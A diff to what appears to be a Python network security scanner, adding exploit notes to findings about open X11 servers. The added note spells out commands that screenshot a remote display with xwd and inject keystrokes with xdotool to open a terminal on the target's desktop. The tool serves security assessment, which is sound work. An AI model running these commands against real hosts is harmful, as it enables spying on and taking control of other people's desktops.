@@ -81,10 +81,12 @@ def x11_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": tool, "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -116,7 +118,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Run X with -nolisten tcp (or the equivalent xorg.conf.d "
                     "override); if remote X is required, prefer SSH X11 "
                     "forwarding and require MIT-MAGIC-COOKIE.",
-                    ["CWE-306", "CWE-284"], kind="x11_open"))
+                    ["CWE-306", "CWE-284"], kind="x11_open",
+                    exploit_note=(
+                        "DISPLAY=<ip>:<display> xwd -root -out /tmp/scr.xwd "
+                        "&& convert /tmp/scr.xwd /tmp/scr.png; then "
+                        "DISPLAY=<ip>:<display> xdotool key ctrl+alt+t   "
+                        "# spawn a terminal on the target's live desktop"),
+                    depth_tier="t1"))
             else:
                 # A refused handshake still confirms the port is X; useful for
                 # discovery but not a finding on its own beyond low disclosure.
